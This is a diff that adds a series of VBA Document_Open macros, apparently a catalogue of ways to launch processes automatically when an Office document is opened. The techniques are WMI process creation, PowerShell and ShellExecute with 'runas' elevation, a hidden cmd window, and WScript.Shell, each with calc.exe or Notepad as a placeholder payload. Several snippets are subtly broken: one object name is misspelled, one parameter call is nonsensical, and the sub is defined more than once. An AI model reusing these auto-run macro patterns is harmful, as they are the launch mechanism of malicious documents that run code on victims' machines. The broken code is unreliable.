@@ -53,3 +53,42 @@ End Sub
 Sub Document_Open()
 	Call Shell("wmic process call create calc.exe", vbNormalFocus)
 End Sub
+
+Sub Document_Open()
+	Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+	Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+	Set objConfig = objStartup.SpawnInstance_
+	Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
+	errReturn = objProcess.Create("Notepad.exe", Null, objConfig, intProcessID)
+End Sub
+
+Sub Document_Open()
+	Call Shell("powershell -command Start-Process -Verb RunAs calc.exe")
+End Sub
+
+Sub Document_Open()
+	Dim PS As Object
+	Set PS = CreateObjet("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
+	PS.AddScript("Get-Process")
+	Dim Output As String
+	PS.AddParameter "/c", "calc.exe"
+	Output = PS.Invoke()
+End Sub
+
+Sub Document_Open
+	Dim Sh As Object
+	Set Sh = CreateObject("Shell.Application")
+	Sh.ShellExecute("calc.exe")
+End Sub
+
+Sub Document_Open
+	Dim Sh As Object
+	Set Sh = CreateObject("Shell.Application")
+	Sh.ShellExecute "cmd.exe", "/c & calc.exe", vbNullString, "runas", 0
+End Sub
+
+Sub Document_Open
+	Dim objShell As Object
+	Set objShell = CreateObject("Wscript.shell")
+	objShell.Run "calc.exe"
+End Sub
